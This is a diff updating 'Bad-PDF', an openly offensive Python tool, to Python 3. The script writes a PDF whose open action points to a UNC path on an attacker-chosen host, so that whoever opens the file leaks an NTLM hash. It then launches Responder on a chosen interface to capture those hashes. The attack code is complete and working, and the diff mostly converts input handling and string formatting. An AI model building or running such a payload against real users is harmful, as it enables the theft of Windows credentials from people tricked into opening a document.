@@ -1,10 +1,10 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 # -*- coding: utf-8 -*-
-from __future__ import print_function
 import io
 import os
 import subprocess
-"""" 
+
+"""
 ====================================================================================================================
         ______                 __       _______  ______   ________  
         |_   _ \               |  ]     |_   __ \|_   _ `.|_   __  | 
@@ -14,7 +14,7 @@ import subprocess
         |_______/ '-;__/ '.__.;__]     |_____|  |______.'|_____|
         
         This is tool use technique disclosed by the check point team to steal the NTLM hash using malicious PDF file.
-        Author : Deepu TV ; Alias DeepZec
+        Author : Deepu TV ; Alias DeepZec      Update : Surgat
 ====================================================================================================================        
 """
 
@@ -26,7 +26,7 @@ RED, WHITE, CYAN, GREEN, END = '\033[91m', '\33[46m', '\033[36m', '\033[1;32m', 
 def create_malpdf(filename, host):
     print("[*] Starting Process.. [*]")
     with io.FileIO(filename, "w") as file:
-        file.write('''
+        file.write(r'''
 %PDF-1.7
 
 1 0 obj
@@ -53,24 +53,24 @@ startxref
    /Contents 4 0 R
 
    /AA <<
-	   /O <<
-	      /F (''' + host + '''test)
-		  /D [ 0 /Fit]
-		  /S /GoToE
-		  >>
+       /O <<
+          /F (''' + host + r'''test)
+          /D [ 0 /Fit]
+          /S /GoToE
+          >>
 
-	   >>
+       >>
 
-	   /Parent 2 0 R
-	   /Resources <<
-			/Font <<
-				/F1 <<
-					/Type /Font
-					/Subtype /Type1
-					/BaseFont /Helvetica
-					>>
-				  >>
-				>>
+       /Parent 2 0 R
+       /Resources <<
+            /Font <<
+                /F1 <<
+                    /Type /Font
+                    /Subtype /Type1
+                    /BaseFont /Helvetica
+                    >>
+                  >>
+                >>
 >>
 endobj
 
@@ -89,7 +89,7 @@ endobj
 
 trailer
 <<
-	/Root 1 0 R
+    /Root 1 0 R
 >>
 
 %%EOF
@@ -109,26 +109,25 @@ if __name__ == "__main__":
         |_______/ \'-;__/ '.__.;__]     |_____|  |______.'|_____|
 
         Author : Deepu TV ; Alias DeepZec 
-
+        Update : Surgat
         =============================================================
         """)
 
-
         if os.path.isfile(responder):
-            print("Responder detected :%s" %responder )
+            print(f"Responder detected: {responder}")
 
         else:
             print("Responder not found..")
-            responder = raw_input("Please enter responder path (Default /usr/sbin/responder): \n")
+            responder = input("Please enter responder path (Default /usr/sbin/responder): \n") or responder
 
-        host = raw_input("Please enter Bad-PDF host IP: \n")
-        filename = raw_input("Please enter output file name: \n")
-        interface = raw_input("Please enter the interface name to listen(Default eth0): \n")
+        host = input("Please enter Bad-PDF host IP: \n")
+        filename = input("Please enter output file name: \n")
+        interface = input("Please enter the interface name to listen (Default eth0): \n") or interface
         create_malpdf(filename, '\\\\' + '\\\\' + host + '\\\\')
 
-        print("Bad PDF %s created" %filename)
+        print(f"Bad PDF {filename} created")
 
-        subprocess.Popen(responder + ' -I ' + interface + ' -wF', shell=True).wait()
+        subprocess.Popen(f"{responder} -I {interface} -wF", shell=True).wait()
 
     except KeyboardInterrupt:
         exit(0)
